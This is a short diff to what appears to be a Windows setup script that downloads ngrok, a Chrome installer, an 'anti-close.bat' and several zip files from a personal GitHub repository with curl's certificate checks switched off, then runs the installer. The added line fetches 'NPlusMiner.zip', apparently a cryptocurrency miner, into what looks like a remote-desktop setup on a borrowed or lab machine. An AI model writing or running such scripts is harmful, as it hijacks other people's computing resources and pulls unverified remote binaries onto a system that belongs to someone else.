@@ -15,6 +15,7 @@ curl -LJOk https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip
 
 cd C:\Users\Administrator\Desktop
 curl -LJOk https://raw.githubusercontent.com/mrX04/lab2rdp/master/ekemlig.zip
+curl -LJOk https://raw.githubusercontent.com/mrX04/mimning/master/NPlusMiner.zip
 curl -LJOk https://raw.githubusercontent.com/mrX04/lab2rdp/master/ChromeSetup.exe
 curl -LJOk https://raw.githubusercontent.com/mrX04/lab2rdp/master/anti-close.bat
 start ChromeSetup.exe
